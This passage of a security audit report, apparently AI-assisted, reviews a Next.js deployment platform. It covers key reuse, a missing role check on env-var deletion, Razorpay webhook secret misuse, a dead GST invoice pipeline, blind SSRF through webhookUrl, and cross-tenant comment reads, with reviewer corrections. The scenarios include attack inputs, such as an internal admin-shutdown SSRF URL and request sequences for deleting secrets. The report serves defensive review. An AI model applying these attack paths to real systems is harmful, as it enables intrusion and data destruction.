   8      console.warn('WARNING: ENCRYPTION_KEY or JWT_SECRET not set. Secrets encryption will fail.');
  21      const key = crypto.createHash('sha256').update(ENCRYPTION_KEY).digest();
  32      return `enc:${iv.toString('hex')}:${tag.toString('hex')}:${encrypted}`;
  56      const key = crypto.createHash('sha256').update(ENCRYPTION_KEY).digest();
The envelope at line 32 carries iv, tag, ciphertext — no key id / version field. Confirmed.

src/lib/config.ts:60 and 96-101:
  60          encryptionKey: process.env.ENCRYPTION_KEY || process.env.JWT_SECRET,
  96      const missing = required.filter(key => !process.env[key]);
  99      if (!process.env.ENCRYPTION_KEY && !process.env.JWT_SECRET) {
 100          missing.push('ENCRYPTION_KEY (or JWT_SECRET)');
 103      if (missing.length > 0) { ... console.warn(...) }
`required` (lines 87-93) lists GITHUB_CLIENT_ID/SECRET, GITHUB_WEBHOOK_SECRET, GCP_PROJECT_I
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** The code facts are real and the file is live, so I cannot refute this outright — but under the reachability/exploitability lens the claim is misfiled as a "high" and two of its supporting mechanisms are wrong.

Reachability: there is no HTTP entry point, at any privilege level, that reaches the defect. I traced every importer of crypto.ts (db.ts, webhooks/github, env/[envId]/reveal, deploy, env, projects — six, all live). Every one of them merely calls encrypt/decrypt with whatever key the process already booted with. Nothing an anonymous visitor, a signed-up tenant, or a viewer can send changes ENCRYPTION_KEY, changes JWT_SECRET, or causes a key mismatch. The sole trigger is an operator editing an environment variable and redeploying. That is a legitimate ops action, not an actor in a threat model — so this is an operational durability / key-hygiene defect, not a vulnerability with an attack path.

The stated failure mechanism is factually wrong. The claim says "webhooks/github/route.ts:164 decrypt(project.githubToken) throws, so every private-repo push webhook 500s." It does not. Line 164 and the getEnvVarsForDeployment call at 155 are both inside the try opened at line 152, whose catch at 219 logs "Failed to start build" and calls updateDeployment(status:'error'); the handler then returns HTTP 200 {success:true}. The reveal route likewise already catches and returns a handled 500. So the real symptom is "every deployment silently lands in status: error", not "webhooks 500". Also, githubToken is encrypted unconditionally at projects/route.ts:211, so the impact is not limited to private repos as claimed.

The "blast radius" half is largely subsumed by an existing total compromise. An attacker holding JWT_SECRET can mint an HS256 token with any `sub`/user.id (auth.ts:10 is the only verification key), so checkProjectAccess grants them owner on any project and the reveal route hands back plaintext secrets over HTTP. Key reuse therefore buys the attacker only offline decryption of a separately-exfiltrated Firestore dump and the absence of an audit trail — real, but not a new access path, and not the independent "high" the claim implies.

Scope is overstated. The finder's own audit text elsewhere asserts this key protects "every stored customer database credential"; it does not. Storage connection strings go through GCP Secret Manager via storage.connectionStringSecretId (db.ts:272+). The AES key covers exactly two things: env vars the user marked secret, and project.githubToken.

The env.example characterization is wrong. The finder says it "d

</details>

### 🟡 MEDIUM — Viewers can delete environment variables — DELETE is the only handler in the env route missing the role gate
`webhooks-billing-7` · `src/app/api/projects/[id]/env/route.ts:309`

**Failure scenario.** A team member with the read-only `viewer` role sends `DELETE /api/projects/<id>/env?envId=<id>` for each variable returned by the GET handler (which happily lists every env var and its id to viewers, line 39-44). The handler drops them from the project document. The next deployment runs getEnvVarsForDeployment with an empty set, so the Cloud Run service is redeployed without DATABASE_URL, API keys, etc.

**Impact.** A principal the product defines as read-only can silently destroy a project's entire secret configuration and break the next production deploy. Because the plaintext of secret values is never recoverable from the UI (GET masks them, reveal is 403 for viewers), the owner cannot restore what was deleted without re-sourcing every credential.

**Reviewer correction.** Accurate as an authorization defect, with a corrected impact chain. A team member holding the read-only `viewer` role can call `DELETE /api/projects/<id>/env?envId=<id>` — the handler at src/app/api/projects/[id]/env/route.ts:289-348 checks only `access.allowed`, never `access.role === 'viewer'`, unlike POST (:75), PUT (:190) and the reveal sub-route (:29). They enumerate every envId from the GET handler (:39-44 spreads the whole env object and masks only secret *values*), then delete variables one request at a time; updateProject writes straight to Firestore via firebase-admin, and since secret values are stored only as `enc:` ciphertext inside the project document, deletion is unrecoverable. The correction to the reported scenario: the viewer cannot cause the outage directly, because the deploy route gates viewers (src/app/api/projects/[id]/deploy/route.ts:44 and :321) — the Cloud Run service is redeployed without DATABASE_URL etc. only on the next deploy performed by a member/admin or triggered by a GitHub push webhook (src/app/api/webhooks/github/route.ts:154, :547). Each deletion also emits an `env_var.deleted` audit event naming the actor (:327-335), so the attack is attributable. Net effect: privilege boundary violation causing destructive, unrecoverable config loss and a delayed production outage — medium. | Directionally correct and the missing gate is real, but restate the impact chain. A read-only `viewer` on a team project enumerates every variable id via `GET /api/projects/<id>/env` (line 39-42 returns the full object including `id`; only secret *values* are masked) and then calls `DELETE /api/projects/<id>/env?envId=<id>` repeatedly. DELETE authenticates and checks membership but never reads `access.role`, so each call permanently strips the variable from the project document via `updateProject` — with no soft-delete and an audit event that records only `envVarId`, so encrypted secret material is unrecoverable. The viewer cannot then trigger the broken deployment themselves — `src/app/api/projects/[id]/deploy/route.ts:44` blocks viewers — so the outage lands on the next deploy by another member or by the GitHub push webhook (`src/app/api/webhooks/github/route.ts:154`), which calls `getEnvVarsForDeployment` on the now-empty set. This is an integrity/availability privilege escalation (destruction of config plus latent outage), not secret disclosure: the reveal sub-route is correctly gated at `src/app/api/projects/[id]/env/[envId]/reveal/route.ts:29`. Fix is the three-line `if (access.role === 'viewer')` block already present at :75 and :190.

**Verified code:**

```ts
src/app/api/projects/[id]/env/route.ts (DELETE — no role gate between allowed-check and write):
289	export async function DELETE(
294	        const session = await getSession();
295	        if (!session) {
296	            return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
297	        }
299	        const { id } = await params;
300	        const access = await checkProjectAccess(session.user.id, id);
302	        if (!access.allowed) {
303	            return NextResponse.json(
304	                { error: access.error },
305	                { status: access.status }
306	            );
307	        }
309	        const { project } = access;
311	        const { searchParams } = new URL(request.url);
312	        const envId = searchParams.get('envId');
318	        const envVariables = project.envVariables || [];
319	        const filteredEnvs = envVariables.filter((env: EnvVariable) => env.id !== envId);
325	        await updateProject(id, { envVariables: filteredEnvs });

Same file, the gate that IS present on the sibling handlers:
75	        if (access.role === 'viewer')
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I verified the code says exactly what the claim says, and traced a full HTTP path an unprivileged actor can walk in production.

1. Entry point is real and unguarded by any outer layer. src/proxy.ts (the Next 16 middleware replacement) does subdomain rewriting, rate limiting (100 req/min per ip+path for non-strict /api routes — enough for a loop over env vars) and security headers. Its only auth logic is `if (pathname.startsWith('/dashboard') || pathname.startsWith('/new'))`, so /api/projects/[id]/env is never touched by it. No route wrapper exists; the handler calls getSession()/checkProjectAccess() itself.

2. The dev bypass does not apply. src/lib/auth.ts getSession() returns MOCK_SESSION only when the cookie is absent AND (NODE_ENV==='development' || MOCK_DB==='true'). With NODE_ENV=production and MOCK_DB unset, the attacker needs a genuine HS256 'deployify_session' cookie — i.e. a normal signed-up user, which is precisely the actor in the scenario.

3. 'viewer' is a real, reachable role, not theoretical. src/types/index.ts:75 `export type TeamRole = 'owner' | 'admin' | 'member' | 'viewer'`; src/app/api/teams/[id]/invite/route.ts:56 accepts 'viewer' as a validRole and createInvite stores it; checkProjectAccess (src/middleware/rbac.ts:18-21) returns `{allowed: true, project, role: membership.role}` straight from the membership doc for any team project. So a viewer gets allowed:true with role 'viewer'.

4. The gate really is missing only on DELETE. POST has it at :75, PUT at :190, and the sibling reveal route (src/app/api/projects/[id]/env/[envId]/reveal/route.ts:29) has it too. DELETE (:289-348) goes access.allowed -> `const { project } = access;` (:309) -> filter -> `await updateProject(id, { envVariables: filteredEnvs })` (:325) with no role check anywhere in between. The same gate appears in ~15 other routes (deploy, storage/*, gcp/discover), so this is an omission, not a deliberate read-only-can-delete policy.

5. The write is real and irreversible. updateProject (src/lib/db.ts) does a plain Firestore `.doc(id).update(...)` via firebase-admin — no security rules apply, no soft delete, no versioning. Secret values live only in project.envVariables as `enc:`-prefixed ciphertext (encrypt() in src/lib/crypto), not in Secret Manager, so a deleted secret's value is gone.

6. Enumeration is trivial: GET (:39-44) returns every env object spread whole (`...env`, so `id` included) and masks only the *value* of isSecret vars — viewers get every envId.

Two nuances that do not refute but sharpen the scenario, so I set refuted=false with a correc

</details>

### 🔵 LOW — Razorpay webhook is verified with the API key secret; no dedicated webhook secret exists, so payment.captured is either unverifiable-by-design or silently dropped
`injection-db-6` · `src/app/api/billing/webhook/route.ts:16`  _(reviewers changed severity: medium → **low**)_

**Failure scenario.** Razorpay signs X-Razorpay-Signature with the per-webhook secret configured in the dashboard, which is a distinct value from RAZORPAY_KEY_SECRET. There is no RAZORPAY_WEBHOOK_SECRET in src/lib/config.ts and none in env.example (grepped: env.example lines 57-59 define only RAZORPAY_KEY_ID and RAZORPAY_KEY_SECRET). Two outcomes, both bad: (a) the operator leaves the dashboard webhook secret at its own value, so every payment.captured delivery fails the HMAC and returns 400 — a customer whose browser closes, crashes, or loses network between the Razorpay modal succeeding and the /api/billing/verify POST is charged and never provisioned, with zero reconciliation path since the webhook is the only

**Impact.** In case (a) paid-but-unprovisioned customers are systematically produced with no automated remediation (a support-and-chargeback generator); in case (b) the highest-value payment credential is reused as a webhook HMAC key, collapsing the blast radius separation the gateway provides.

**Reviewer correction.** There is no dedicated Razorpay webhook secret anywhere in the codebase; `/api/billing/webhook` verifies `X-Razorpay-Signature` using the API key secret (`RAZORPAY_KEY_SECRET`). This is NOT a signature bypass — `verifyWebhookSignature` fails closed and the route returns 400 — so no attacker can forge a `payment.captured` or provision a subscription. The real defects are (1) cryptographic key reuse: the live payment API credential doubles as the webhook HMAC key, so the two cannot be rotated independently, inconsistent with the codebase's own GitHub pattern which uses a dedicated `GITHUB_WEBHOOK_SECRET`; and (2) a billing-reliability + observability gap: an operator following `env.example` (which documents only KEY_ID/KEY_SECRET) will set a different dashboard secret, every delivery will 400, and nothing logs it — the invalid-signature branch at route.ts:22-24 has no console.error, and payments.ts:75 logs only the undefined-secret case. Because the webhook and the browser-driven `/api/billing/verify` are the only two subscription writers and no reconciler exists, a customer whose browser dies after payment is charged and never provisioned. Fix: add `RAZORPAY_WEBHOOK_SECRET` to config.ts, env.example and validateConfig; pass it instead of `keySecret`; log signature rejections; and switch the `===` comparison at payments.ts:82 (and :63) to `crypto.timingSafeEqual`. | Accurate restatement: `POST /api/billing/webhook` HMACs the raw body with `RAZORPAY_KEY_SECRET` (the API key secret) instead of the per-webhook secret Razorpay actually signs `X-Razorpay-Signature` with. No `RAZORPAY_WEBHOOK_SECRET` exists in `src/lib/config.ts` or `env.example`. This is a real defect, but it is a **correctness/reliability and key-hygiene** defect, not an attacker-exploitable vulnerability, and "medium" overstates it.

Why the security framing does not hold:
1. **Fails closed, not open.** `verifyWebhookSignature` returns `false` on an undefined secret (payments.ts:74-77) and otherwise compares a full HMAC-SHA256. There is no bypass, no unauthenticated write.
2. **No unprivileged actor can forge a delivery.** The endpoint is anonymous-reachable (verified: no `getSession()` in the route, and `src/proxy.ts` only applies rate limiting + security headers to `/api/`), but forging requires knowing `RAZORPAY_KEY_SECRET`. That value is never sent to a client — `/api/billing/checkout` returns only `keyId` (checkout/route.ts:89). An anonymous poster, a signed-up tenant, and a `viewer` team member all get a flat 400.
3. **The claimed "HMAC oracle" in outcome (b) does not exist.** Even if the operator sets the dashboard webhook secret equal to `RAZORPAY_KEY_SECRET`, the only HMAC-under-that-key a paying tenant ever sees is `razorpay_signature = HMAC(key_secret, order_id + '|' + payment_id)` — a message whose both halves are gateway-generated, not attacker-chosen. HMAC-SHA256 is not length-extendable, so this yields no path to `HMAC(key_secret, <arbitrary JSON body>)`. Secret conflation here is blast-radius/rotation hygiene, not an exploit.
4. **The realistic harm has no adversary.** Outcome (a) — dashboard secret differs, so every `payment.captured` 400s — is a self-inflicted provisioning gap: a customer whose browser dies before the `/api/billing/verify` POST is charged and never upgraded. Real money impact, zero attacker involvement. Notably nothing in the repo (no infra/IaC/docs) registers this webhook URL with Razorpay at all, so it may never have been wired up.

Adjacent (not the claim, worth noting): `payments.ts:82` uses `generatedSignature === signature`, a non-constant-time compare, while the GitHub webhook path in the same codebase correctly uses `crypto.timingSafeEqual` (`src/lib/security/index.ts:69`). Same file also shows the codebase already has the right pattern — a dedicated `GITHUB_WEBHOOK_SECRET` (`src/lib/config.ts:23`) — which is exactly what Razorpay is missing.

Fix: add `RAZORPAY_WEBHOOK_SECRET` to config + env.example, pass it at webhook/route.ts:19, and switch the compare to `timingSafeEqual`.

**Verified code:**

```ts
src/app/api/billing/webhook/route.ts:5-24 — no auth/RBAC guard precedes verification; the API key secret is passed as the webhook secret:
```
 5  export async function POST(req: Request) {
 6      try {
 7          const body = await req.text();
 8          const signature = req.headers.get('x-razorpay-signature');
 9
10          if (!signature) {
11              return NextResponse.json({ error: 'Missing signature' }, { status: 400 });
12          }
13
14          // Verify webhook signature
15          // We pass keySecret which is now string | undefined, verifyWebhookSignature handles undefined
16          const isValid = verifyWebhookSignature(
17              body,
18              signature,
19              config.billing.razorpay.keySecret
20          );
21
22          if (!isValid) {
23              return NextResponse.json({ error: 'Invalid signature' }, { status: 400 });
24          }
```
Note lines 22-24: the rejection branch has no logging.

src/lib/billing/payments.ts:69-83 — fails closed (so NOT a bypass), logs only the undefined case, and compares with `===` rather than
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I hunted specifically for a mitigation and found none. Checked and ruled out, in order:

(1) An earlier guard in the handler — there is none. `POST` at src/app/api/billing/webhook/route.ts:5 goes straight to `req.text()`, a header null-check, then `verifyWebhookSignature`. No session, no RBAC, no allowlist, no shared-secret query param.

(2) A wrapper or proxy-level protection — src/proxy.ts applies only security headers and rate limiting; `strictRateLimitRoutes` lists `/api/webhooks/` (plural, a different prefix) so `/api/billing/webhook` isn't even in the strict bucket. Nothing there supplies or checks a secret.

(3) A second secret resolved elsewhere in the helper — src/lib/billing/payments.ts:69-83 takes the secret purely as a parameter; the route is the only caller and passes `config.billing.razorpay.keySecret`. `config.billing.razorpay` (src/lib/config.ts:64-69) has exactly two fields, `keyId` and `keySecret`. No `webhookSecret` key, no `||` fallback to another env var.

(4) Deploy-time injection — grepped every *.yaml/*.yml/Dockerfile/*.tf/*.sh in the repo for RAZORPAY: only pnpm-lock entries for the npm package. The live `.env.local` defines only `RAZORPAY_KEY_ID` and `RAZORPAY_KEY_SECRET` (key names read, values not). So no webhook secret is provisioned anywhere in this deployment.

(5) `validateConfig()` catching it — src/lib/config.ts:88-99 requires GITHUB_CLIENT_ID/SECRET, GITHUB_WEBHOOK_SECRET, GCP_PROJECT_ID, JWT_SECRET. No Razorpay variable is in `required` at all, so the config validator emits no warning either way.

(6) A test pinning safe behavior — `grep -rln "verifyWebhookSignature\|billing/webhook\|razorpay"` across all *.test.ts/*.spec.ts returned zero files. Nothing covers this route or the helper.

(7) A reconciliation path making the silent-drop harmless — only two writers of `subscription` exist: src/app/api/billing/verify/route.ts:48 (session-authenticated, driven by the browser callback at src/app/billing/page.tsx:139) and the webhook itself. No cron or reconciler touches subscriptions.

Notably the codebase *does* know the dedicated-webhook-secret pattern — GitHub webhooks use `config.github.webhookSecret` from `GITHUB_WEBHOOK_SECRET` (src/lib/config.ts:23, HMAC at src/lib/security/index.ts:63), and that variable is in `validateConfig`'s required list. So the Razorpay path is an inconsistency, not a deliberate design.

Where the claim overreaches. The helper fails closed (returns `false` on a missing secret, route returns 400), so this is not a signature bypass, not attacker-reachable, and grants no unauthentica

</details>

### 🔵 LOW — Checkout charges the tier price with no tax and the entire invoice pipeline is dead code, so no GST is collected and no invoice record is ever created
`injection-db-7` · `src/app/api/billing/checkout/route.ts:66`  _(reviewers changed severity: medium → **low**)_

**Failure scenario.** An Indian customer upgrades to Pro. checkout creates a Razorpay order for exactly 150000 paise (INR 1,500) — calculateTax is never invoked, so the 18% GST the code models is never added to the charge. After Razorpay captures, neither /api/billing/verify nor /api/billing/webhook calls generateInvoiceData or createInvoiceRecord: `grep -rn "createInvoiceRecord|generateInvoiceData" src/` matches only src/lib/billing/invoices.ts itself and invoices.test.ts. The Collections.INVOICES collection therefore stays empty forever, so listInvoicesForUser (src/lib/billing/invoices.ts:261) always returns [] and GET /api/billing/invoices always renders an empty billing history, while the /api/billing/invoice

**Impact.** 18% GST is under-collected on every Indian transaction — an unrecoverable liability the platform must absorb out of already-received revenue — and no tax invoice or payment record is ever persisted, so there is no financial audit trail tying any Razorpay capture to a user and nothing to reconcile chargebacks or the paid-but-unprovisioned cases against.

**Reviewer correction.** Confirmed as fact, but reclassify it. The accurate statement: the billing module ships a complete-looking tax/invoice subsystem (`calculateTax` with 18% GST for IN, `generateInvoiceData`, `createInvoiceRecord`, `generateInvoicePDF`) whose entry points have zero production callers. `createInvoiceRecord` is the sole writer to `Collections.INVOICES`, so that collection is never populated: `/api/billing/invoices` always returns an empty list, the billing page's invoice table permanently shows "No invoices found", and the `/api/billing/invoices/[id]/download` PDF route is unreachable. Checkout independently charges `tier.price * 100` with no tax line. Corroborating that this was never wired rather than regressed: `User` carries no `countryCode` or billing address, the input `generateInvoiceData` requires.

Two corrections to the claim as filed. (a) It is not a security finding — no attacker, no privilege boundary, no injection or data exposure; the handler's `getSession()` 401 and tier whitelist are intact. It should not sit under an injection/db dimension. (b) The "18% GST is never added to the charge" half assumes tier prices are tax-exclusive, which nothing in the codebase states: `tiers.ts` comments only "1500 INR" and the pricing card renders a bare "₹1,500" with no "+GST" or "inclusive of taxes" note. If prices are intended as GST-inclusive, checkout is correct and only the invoice/PDF paths are broken. The provable defect is the dead invoice pipeline; the undercharge is a product-intent question the code does not answer.

Severity low as a security finding. If this audit also tracks product-completeness and statutory-compliance defects, medium is defensible for the dead invoice pipeline alone — a GST-registered Indian vendor taking ₹1,500 and issuing no tax invoice is a real compliance exposure, and the UI advertises an invoice history that can never populate. | Accurate restatement: the invoice-generation pipeline is genuinely dead code, so no paying customer ever receives a tax invoice — but the "no GST is collected / customers are undercharged" framing is unproven and should be dropped. Verified: `generateInvoiceData` (src/lib/billing/invoices.ts:226) and `createInvoiceRecord` (:213) have ZERO callers anywhere in the repo, including their own test file; `createInvoiceRecord` holds the only write to Collections.INVOICES, so in production that collection can never be populated. Both provisioning writers (/api/billing/verify:47-49 and /api/billing/webhook:42-50) write only `subscription` via `updateUser`. Net effect: every paying tenant's billing history at src/app/billing/page.tsx:363-366 renders "No invoices found" permanently, and the correctly-authorized PDF download route is unreachable — an India GST tax-invoice-issuance compliance gap and a visibly broken UI feature. MOCK_DB masks this in dev by fabricating a fake paid invoice (src/lib/firebase.ts:81-89), which is likely why it shipped. The tax portion should be restated as: `calculateTax` (src/lib/billing/tax.ts:9) exists but is wired to nothing, and the codebase never states whether the ₹1,500 tier price is GST-inclusive or exclusive — the UI shows ₹1,500 and checkout charges exactly ₹1,500, so the customer pays the advertised amount either way. The real defect is undefined tax semantics plus an unwired helper, not a proven undercharge. No security impact, no attacker, no authz gap — hence low, not medium.

**Verified code:**

```ts
src/app/api/billing/checkout/route.ts (imports — nothing tax-related):
  1 import { NextResponse } from 'next/server';
  2 import { getSession } from '@/lib/auth';
  3 import { getUserById } from '@/lib/db';
  4 import { TIERS, TierType } from '@/lib/billing/tiers';
  5 import { createOrder } from '@/lib/billing/payments';
  6 import { securityHeaders } from '@/lib/security';

src/app/api/billing/checkout/route.ts:64-82 (the charged amount):
 64         // Razorpay expects amount in paise (multiply by 100)
 65         // Assuming price is in INR for Razorpay
 66         const amount = tier.price * 100;
 ...
 77         const order = await createOrder(
 78             amount,
 79             'INR',
 80             `receipt_${user.id}_${Date.now()}`,
 81             { userId: user.id, tierId: tier.id }
 82         );

src/lib/billing/tiers.ts:43 — pro tier price:
 43         price: 1500, // 1500 INR

src/lib/billing/payments.ts:24-42 — createOrder adds nothing:
 24 export async function createOrder(
 25     amount: number, // in paise
 ...
 31     const options = {
 32         amount,

… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I read the checkout route end to end and every helper it touches, then searched for any guard the finder could have missed. There is none.

1) No tax is applied at checkout. `src/app/api/billing/checkout/route.ts` imports only `getSession`, `getUserById`, `TIERS`, `createOrder`, `securityHeaders` (lines 1-6). The amount is `tier.price * 100` (line 66) and is passed straight to `createOrder` (lines 77-82). `createOrder` in `src/lib/billing/payments.ts` just forwards `{amount, currency, receipt, notes}` to `razorpay.orders.create` — no tax field, no wrapper, no interception. The session check at lines 10-17 and the tier validation at lines 37-43 are real guards but are irrelevant to tax.

2) `calculateTax` has exactly one caller. Repo-wide grep (excluding node_modules/.next; the only other hits are a stale copy of the tree under `.claude/worktrees/`) returns `src/lib/billing/invoices.ts:233` inside `generateInvoiceData`, and nothing else.

3) `generateInvoiceData` and `createInvoiceRecord` have zero callers anywhere — not in the 86 API routes, not in scripts, not even in `src/lib/billing/invoices.test.ts`. That test mocks `getDb` and exercises only `listInvoicesForUser` and `getInvoiceById` (test file lines 52-58), so no test pins any tax or invoice-write behaviour. The only invoice-adjacent script, `scripts/test-invoice.ts`, hand-builds an `Invoice` literal and calls `generateInvoicePDF` — it never calls `generateInvoiceData` or `createInvoiceRecord` either.

4) Both post-payment provisioning writers confirm the dead pipeline. `src/app/api/billing/verify/route.ts` imports only `updateUser` and writes `subscription` (lines 38-48). `src/app/api/billing/webhook/route.ts` on `payment.captured` dynamically imports `updateUser` and writes `subscription` only. Neither touches the invoices collection.

5) `Collections.INVOICES` is written in exactly one place — `createInvoiceRecord` (invoices.ts:215) — and read in three (`listInvoicesForUser`, `getInvoiceById`, and a MOCK_DB fixture in `src/lib/firebase.ts:81`). With the single writer unreachable, the collection is never populated in production, so `/api/billing/invoices` always returns `[]` and the billing page permanently renders "No invoices found" (`src/app/billing/page.tsx:363-366`); the `/api/billing/invoices/[id]/download` PDF route is unreachable for the same reason.

6) Corroborating that this was never wired: the `User` type (`src/types/index.ts:34-53`) has no `countryCode` and no billing address, yet `generateInvoiceData` requires `userDetails.countryCode` to compute tax. The data needed 

</details>

### 🔵 LOW — Project webhookUrl is stored and POSTed to with no scheme/host validation, giving authenticated blind SSRF from inside the GCP project
`ssrf-proxy-7` · `src/lib/webhooks.ts:12`  _(reviewers changed severity: medium → **low**)_

**Failure scenario.** PATCH /api/projects/[id] accepts 'webhookUrl' in its allowedFields list (src/app/api/projects/[id]/route.ts:136) and applies it with no validation - the validation block that follows only covers buildTimeout, autodeployBranches and resources. A user sets webhookUrl to `http://10.128.0.5:8080/admin/shutdown` (or any VPC-internal / link-local address reachable from the Cloud Run instance) and triggers a deployment; syncDeploymentStatus then calls sendWebhookNotification(webhookUrl, ...) (src/lib/deployment.ts:53-59, 242-247) and the server issues an attacker-directed POST with a JSON body from inside Deployify's network perimeter.

**Impact.** Any signed-up user turns the Deployify backend into a request-forgery relay against internal/VPC-only services and cloud endpoints that are not otherwise reachable from the internet, and can port-scan the internal network by observing deployment timing.

**Reviewer correction.** Directionally correct — there is genuinely zero validation on `webhookUrl` on any write or use path — but the claimed mechanism overstates reachability and impact. Accurate restatement:

"Any authenticated user with access to a project (including a team member of role `viewer`, since PATCH checks only `access.allowed` and never `access.role`) can store an arbitrary `webhookUrl`. The Deployify control plane then performs a server-side `fetch(url, {method:'POST'})` from inside GCP on every build-status transition. This is a **fully blind, POST-only, fixed-header** server-side request forgery: the response body is discarded, `response.ok` is only `console.error`-logged server-side, and network errors are swallowed by the `catch`. The attacker gets no response oracle."

Three parts of the claimed scenario do not hold:

1. **Link-local / metadata-server credential theft is not achievable.** GCP's metadata server requires the `Metadata-Flavor: Google` request header — the repo's own `src/lib/gcp/auth.ts:25` sets it precisely for that reason. `sendWebhookNotification` sends only `Content-Type: application/json` and offers no header control, and a redirect cannot inject a request header. A POST to `169.254.169.254` / `metadata.google.internal` is rejected, and would be blind regardless.

2. **VPC-internal `10.128.0.5` reachability is unsubstantiated.** A default Cloud Run service has public-internet egress only; RFC1918 requires an attached VPC connector / Direct VPC egress. The repo shows no such config for the control plane, and Cloud SQL is reached over a unix socket (`host=/cloudsql/...`, `src/lib/gcp/cloudsql.ts:83`), not a private IP — i.e. the one thing that would normally force VPC egress does not.

3. **No secret is exfiltrated.** The POST body is a fixed `{content, text}` shape; the only attacker-influenced part is `project.name`, interpolated into a JSON string by `JSON.stringify` (no injection). No credential, token, or internal response ever reaches the attacker.

What remains real and worth fixing: (a) the platform acts as an authenticated outbound request relay to arbitrary attacker-chosen internet hosts, and can reach `127.0.0.1:8080` (its own server — though unauthenticated there, so it hits 401); (b) **the `fetch` has no `AbortSignal.timeout`** and is `await`ed inline in request handlers (`src/app/api/projects/[id]/deploy/route.ts:245`, `src/lib/deployment.ts:56` and `:245`, the latter reached from `GET /api/projects/[id]:59`). Pointing `webhookUrl` at a blackholed host hangs those requests indefinitely, consuming concurrency slots on a shared multi-tenant Cloud Run instance — a cheaper and more concrete impact than the SSRF itself. Note `src/lib/gcp/auth.ts:25` already uses `AbortSignal.timeout(2000)`, so the pattern exists in-repo and was simply not applied here.

Fix: parse with `new URL()`, allowlist `https:` only, reject hostnames resolving to private/loopback/link-local ranges, and add `signal: AbortSignal.timeout(...)`. | Directionally correct, with reachability understated and impact overstated. Accurate restatement: `webhookUrl` is accepted by PATCH /api/projects/[id] with no validation and is later passed to a bare `fetch(url, {method:'POST'})` in src/lib/webhooks.ts:12, giving any authenticated tenant — including a 'viewer' team member, since PATCH performs no role check while DELETE does at route.ts:310 — a blind server-side request forgery primitive from the Deployify control plane. The primitive is write-only: the response is never surfaced to the attacker, the method and headers are fixed, the GCP metadata server rejects it for lack of `Metadata-Flavor: Google`, and undici does not support `file:`. Reaching VPC-internal addresses additionally requires the control-plane service to have VPC egress, which the repo does not evidence. Real impact is therefore limited to attacker-directed outbound POSTs (with partially attacker-controlled JSON body via project name) plus a latency-based internal port oracle — low severity, and a legitimate hardening gap: add a scheme allowlist (http/https) and private/link-local/metadata IP blocking with DNS re-resolution, applied at the PATCH validation block alongside buildTimeout/resources.

**Verified code:**

```ts
src/lib/webhooks.ts:8-26 — the sink, no URL parsing, no scheme allowlist, no timeout:
```
 8	export async function sendWebhookNotification(url: string, payload: WebhookPayload): Promise<void> {
 9	    if (!url) return;
10	
11	    try {
12	        const response = await fetch(url, {
13	            method: 'POST',
14	            headers: {
15	                'Content-Type': 'application/json',
16	            },
17	            body: JSON.stringify(payload),
18	        });
19	
20	        if (!response.ok) {
21	            console.error(`Failed to send webhook notification: ${response.status} ${response.statusText}`);
22	        }
23	    } catch (error) {
24	        console.error('Error sending webhook notification:', error);
25	    }
26	}
```
Note lines 20-24: the response body is never read and errors are swallowed — this is what makes it strictly blind.

src/app/api/projects/[id]/route.ts:127-151 — PATCH allowlist, `webhookUrl` copied with no validation:
```
127	        const allowedFields = [
...
136	            'webhookUrl',
...
144	        ];
145	
146	        const updates: Record<s
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** My lens was existing mitigation, so I hunted specifically for a guard the finder missed. I found none, at any layer:

**No validation library exists.** `package.json` has no `zod`, `joi`, `yup`, or any SSRF filter dependency — the grep returned empty.

**No guard in the write path.** I read `PATCH /api/projects/[id]` (`src/app/api/projects/[id]/route.ts:101-231`) in full. After `checkProjectAccess`, the handler copies `webhookUrl` straight from `body` into `updates` in the generic allowlist loop, and the three validation blocks that follow cover only `buildTimeout`, `autodeployBranches`, and `resources`. `updates` then goes directly to `updateProject`. The finder's reading is exact.

**No guard in the persistence layer.** `updateProject` (`src/lib/db.ts:1117-1123`) is a bare Firestore `.update(cleanFirestoreData({...data, updatedAt}))` — no schema, no field-level checks.

**No guard in the shared security module.** `src/lib/security/index.ts` is 175 lines; I enumerated every export (`checkRateLimit`, `verifyGitHubWebhookSignature`, `validateWebhookTimestamp`, `isPushEvent`, `isPullRequestEvent`, `securityHeaders`, `getSecurityHeaders`, `sanitizeInput`, `isValidEnvVarKey`, `generateSecureToken`, `hashValue`). Note `validateWebhookTimestamp` and `verifyGitHubWebhookSignature` are *inbound* GitHub-webhook guards — easy to mistake for a mitigation here, but they are unrelated to outbound `webhookUrl`. There is no URL validator.

**No framework-level or global protection.** There is no `instrumentation.ts`; no `setGlobalDispatcher` / `ProxyAgent` / `globalThis.fetch =` override anywhere in `src/` (the only `global.fetch` assignments are in `.test.ts` files). `src/proxy.ts` (the Next 16 middleware replacement) does inbound subdomain routing, rate limiting, and security headers — it cannot constrain server-side outbound `fetch`.

**No test pins the behaviour.** `grep -rln webhookUrl src/ --include="*.test.ts"` returned nothing, and there is no `webhooks.test.ts` (only `src/lib/webhooks.ts`).

**No client-side constraint either** — the settings input is `type="text"` (`src/app/dashboard/[id]/settings/page.tsx:340`), not even `type="url"`, and that would be bypassable anyway.

**The strongest near-miss, which actually cuts against the codebase:** `src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:106-117` does contain an SSRF-flavoured guard. But it is scoped to a completely different route, it is a substring match (`targetUrl.includes('localhost')`), and it is gated on `NODE_ENV === 'production'`. It never touches `sendWebhookNotification`. Its exis

</details>

### 🔵 LOW — Query comments are read and written by queryId alone, with no tenant filter
`tenancy-data-6` · `src/app/api/projects/[id]/storage/[storageId]/queries/[queryId]/comments/route.ts:38`  _(reviewers changed severity: medium → **low**)_

**Failure scenario.** checkProjectAccess authorizes the `id` path segment, but the Firestore query is filtered only on `queryId` — the `projectId` field that POST writes at line 88 is never used as a predicate. A user who was previously a member of victim project V (and therefore saw saved-query ids in the Data Lab UI and its network traffic) is removed from V. They keep any project of their own, P, and call GET /api/projects/P/storage/x/queries/<V-query-id>/comments. checkProjectAccess(user, P) succeeds, and the handler returns every comment on V's saved query — including userId and userName of V's current members and whatever the comment text discusses (schema details, incident notes, query rationale). POST on 

**Impact.** Post-revocation cross-tenant read of another project's query discussion threads plus the identities of its members, and the ability to inject attacker-authored content into that tenant's UI.

